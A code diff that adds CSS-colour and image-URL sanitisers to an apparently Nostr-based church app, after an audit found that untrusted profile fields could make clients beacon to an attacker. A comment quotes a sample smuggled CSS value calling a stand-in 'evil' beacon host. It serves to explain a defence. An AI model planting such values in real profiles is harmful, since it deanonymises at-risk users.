@@ -24,6 +24,24 @@ window.sanitizeHtml = function (html) {
     return t.innerHTML;
   } catch (e) { return String(html).replace(/<[^>]*>/g, ""); }   // fallback: strip all tags
 };
+// SECURITY-AUDIT-2026-07-06 H2/M7/L6: profile fields (church + member accent/picture/banner/photo) come
+// from untrusted relay-published kind-0 events and are interpolated into CSS background/url() or an <img src>.
+// A crafted value like "#fff),url(https://evil/beacon)/*" or a remote picture URL makes every viewer's client
+// fetch an attacker host on render → silent IP/geo/online-time deanonymisation (persecuted-church threat model).
+// Guard at every render site. Mirrors the inline guard identity-avatar.jsx already had for member avatars.
+//   safeCssColor: accept ONLY a hex literal or a `var(--token)`; else fall back. Blocks url()/expression smuggling.
+//   safeImgUrl:   accept ONLY a `data:image/...` URI (how the app itself makes uploads — cropped data URIs);
+//                 reject remote/`http(s):`/`javascript:` etc. so a profile field can never beacon out.
+window.safeCssColor = function (v, fallback) {
+  const s = typeof v === "string" ? v.trim() : "";
+  if (/^#[0-9a-fA-F]{3,8}$/.test(s)) return s;
+  if (/^var\(--[a-zA-Z0-9-]+\)$/.test(s)) return s;
+  return fallback || "var(--clay)";
+};
+window.safeImgUrl = function (v) {
+  const s = typeof v === "string" ? v.trim() : "";
+  return /^data:image\/[a-zA-Z0-9.+-]+;/.test(s) ? s : "";
+};
 (function () {
   const SQLJS_BASE = "vendor/sqljs/";   // vendored locally (offline); was cdnjs
 
